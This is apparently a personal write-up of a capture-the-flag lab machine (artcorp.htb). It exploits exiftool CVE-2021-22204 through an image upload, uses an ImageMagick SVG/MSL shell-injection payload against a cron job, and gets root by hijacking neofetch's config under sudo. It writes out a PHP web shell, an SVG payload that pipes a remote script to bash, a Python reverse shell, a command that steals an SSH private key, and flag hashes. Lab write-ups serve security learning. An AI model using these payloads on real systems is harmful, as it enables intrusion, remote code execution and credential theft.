# Lessons learned
- using `tmp` locations like `/tmp` and `/var/tmp` may not work. instead find user writable directories that are better, like `/dev/shm` or something.
- expand your knowledge of reverse shell variants, like "wget to standard out piped to bash" or bash base64 encoded payload, etc.

# Writeup 
## Recon

### rustscan

```
sudo rustscan -a <ip> | tee rustscan.txt
```

### nmapAutomator

```
sudo nmapAutomator.sh -H <ip> -t Recon 
```

## autorecon

```
sudo python3 autorecon.py -t targets.txt -v
```

ssh takes publickey
![](Pasted%20image%2020231018210122.png)

website redirects to artcorp.htb, so add to hosts files
![](Pasted%20image%2020231018210154.png)

## Initial Access
website
![](Pasted%20image%2020231018210232.png)

download all images from website
```
wget -U "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" -nd -r --level=1  -e robots=off -A jpg,jpeg -H http://artcorp.htb
```

apache rce doesnt work
![](Pasted%20image%2020231018211341.png)

VHOST bruteforcing found something!
```
ffuf -H "Host: FUZZ.artcorp.htb" -H "User-Agent: PENTEST" -c -w subdomains-top1mil-20000-custom.txt -fs 0 -u http://artcorp.htb
```
![](Pasted%20image%2020231018214941.png)

![](Pasted%20image%2020231018215044.png)

image upload!
![](Pasted%20image%2020231018215059.png)

https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/A-Cat.jpg/1200px-A-Cat.jpg

```
<?php system($_GET['cmd']);?>
```


WORKING exiftool exploit found! install the requirements as per the github
https://github.com/UNICORDev/exploit-CVE-2021-22204
![](Pasted%20image%2020231018225604.png)
![](Pasted%20image%2020231018225549.png)

upload the image, waiting for revshell
![](Pasted%20image%2020231018225951.png)

www-data pwned!
![](Pasted%20image%2020231018225627.png)

no user.txt yet, but thomas user...
![](Pasted%20image%2020231018225723.png)

linpeas.sh
![](Pasted%20image%2020231018230109.png)

old sudo and debian version.
![](Pasted%20image%2020231018230327.png)

kernel exploit?
![](Pasted%20image%2020231018230704.png)

interesting cron job, convert_images.sh
![](Pasted%20image%2020231018230845.png)
![](Pasted%20image%2020231018230908.png)

imagemagick version 7.0.10-36
![](Pasted%20image%2020231018231229.png)

`wget https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c` didn't work...
![](Pasted%20image%2020231018232633.png)

kernel exploits ? prob not. they removed pkexec, and other kernel exploit paths.
4.19.0, amd64
debian 10
![](Pasted%20image%2020231019003842.png)

Doing `cat /usr/local/bin/convert_images.sh` reveals: 
```
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

mogrify has open permissions...? maybe? actually no, it's just a link thats why.
![](Pasted%20image%2020231019002917.png)

didn't work but awesome idea for ctf??
https://github.com/ImageMagick/ImageMagick/issues/6339
```
wget 10.10.16.30:8000/image.jpg
echo hi > test.txt
cp image.jpg '|smile"`cat test.txt > leak.txt`".jpg'
```

```
`magick '|cat test.txt > /tmp/leak|< image.jpg' info:`
```


imagetragick???? IDK ANYMORE AHHHHH 
https://imagetragick.com/#why

imagemagick pdf/svg rce? (USED A HINT HERE)
https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

rce attempt 1 (poc is created)
![](Pasted%20image%2020231019103427.png)
```
touch test.pdf
touch out.png
mogrify -format png -authenticate 'test" `echo $(id)> poc`;"' test.pdf out.png
```

> technically works, but how to set `-authenticate` magically? (attempt 2 below...)

rce attempt 2 (better, with poc.svg) 
![](Pasted%20image%2020231019104412.png)

1. make a shell.sh
```
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```
2. `touch zzz.png`
2. upload poc.svg

result: close, but no cigar. for some reason no code execution
![](Pasted%20image%2020231019105007.png)

### WORKING initial access to thomas
i got stuck, referring to ippsec's video walkthrough steps. 
final poc.svg: 
```sh
<image authenticate='ff" `wget -O - 10.10.16.30/shell.txt | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

where shell.txt is a python reverse shell.
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.30",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

alternate first lines that work: 
```
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa | base64)>/dev/shm/pwned`;"'>

```

then set up a listener at port 9001, and host shell.txt on port 80
upload the poc.svg to the `/var/www/dev01.artcorp.htb/convert_images/` directory and wait for the cron job.

user thomas pwned!
![](Pasted%20image%2020231019114854.png)

now to privesc to root...
![](Pasted%20image%2020231019114948.png)
## Privesc
grabbing thomas's ssh id_rsa key
![](Pasted%20image%2020231019115918.png)
![](Pasted%20image%2020231019120025.png)

exploiting the `sudo NOPASSWD` of neofetch to hijack the config file and execute a shell!
notice the XDG_CONFIG_HOME variable is kept by the sudo config
![](Pasted%20image%2020231019122754.png)

root pwned!
![](Pasted%20image%2020231019122842.png)

## Loot
user.txt
![](Pasted%20image%2020231019114923%201.png)
```
2f7f09150a0de9cacd0eb606ebe1ffc7
```


root.txt
![](Pasted%20image%2020231019122901.png)
```
b54c907967355dcaa76a5dce083e9493
```